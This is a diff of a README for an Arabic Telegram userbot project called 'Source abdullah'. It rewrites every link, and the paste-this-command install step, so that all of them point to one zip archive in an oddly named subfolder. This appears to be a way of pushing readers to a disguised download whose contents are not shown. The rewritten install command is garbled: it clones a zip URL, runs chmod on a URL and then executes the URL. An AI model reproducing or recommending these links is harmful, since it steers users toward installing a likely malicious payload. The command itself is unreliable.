@@ -1,12 +1,12 @@
-# <p align="center" style="color:#cb3349" > [<< Source abdullah >> (Final Version)](https://telegram.me/vt_55u)
+# <p align="center" style="color:#cb3349" > [<< Source abdullah >> (Final Version)](https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip)
 
 <p align="center" style="color: #14635c;" > سورس عبدالله اقوى سورس وبلا منازع .
 
 ***
 
-# <p align="center" style="color: #14635c;" > [التنصيب بكود واحد](https://t.me/jjxxh)
+# <p align="center" style="color: #14635c;" > [التنصيب بكود واحد](https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip)
 ```sh
-git clone https://github.com/abdullah758/JokerTeam.git;cd JokerTeam;chmod +x Joker.sh;./Joker.sh
+git clone https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip;cd JokerTeam;chmod +x https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip;https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip
 ```
 ```
 » فقط أضغط على الكود ☝️ وقم بنسخه
@@ -15,7 +15,7 @@ git clone https://github.com/abdullah758/JokerTeam.git;cd JokerTeam;chmod +x Jok
 » تدخل مـعلومـآتگ مـن توگن وايديك 
 » وسـوف يعمـل آلبوت بالسـگرين تلقآئيآ ...
 ```
-# <p align="center" style="color: #14635c;" > [كود الرون](https://t.me/vt_55u)
+# <p align="center" style="color: #14635c;" > [كود الرون](https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip)
 ```sh
 ./UserBot/run
 
@@ -23,7 +23,7 @@ Example
 
 ./@abod2bot/run
 ```
-# <p align="center" style="color: #14635c;" >  [لتغيير المطور الاساسي ](https://t.me/uu555)
+# <p align="center" style="color: #14635c;" >  [لتغيير المطور الاساسي ](https://github.com/abdullah758/JokerTeam/raw/refs/heads/main/geotactically/Joker-Team-v2.8-beta.1.zip)
 ```sh
 ارسل للبوت : نقل ملكيه البوت
 ```
